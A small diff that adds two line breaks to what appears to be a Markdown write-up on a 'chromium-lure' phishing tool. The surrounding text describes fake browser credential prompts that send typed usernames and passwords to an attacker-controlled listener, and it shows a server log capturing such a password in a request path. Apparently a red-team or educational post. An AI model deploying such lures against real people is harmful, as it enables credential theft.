@@ -152,6 +152,7 @@ Finally we Link the form in the HTML to the `credentialForm` ID.
 With this setup, we can use either of the following to set up a listener:
 - `python -m http.server` (or a simple PowerShell script) running locally on the machine
 - a public domain or IP address the attacker controls
+<br>
 ```
 PS C:\Users\drew\chromium-lure> .\SimpleHTTPServer.ps1 -Port 8000
 [*] Starting HTTP Server on http://127.0.0.1:8000
@@ -160,6 +161,7 @@ PS C:\Users\drew\chromium-lure> .\SimpleHTTPServer.ps1 -Port 8000
 [*] [2026-07-16 20:17:26] Request from 127.0.0.1
 [*] Path: /drew:mysecurepassword1234567
 ```
+<br>
 ## Custom Generation Script
 I then decided to create a python script to generate various different type of credential windows. I wanted to develop the following features:
 - Customizable prompt message, title and favicon
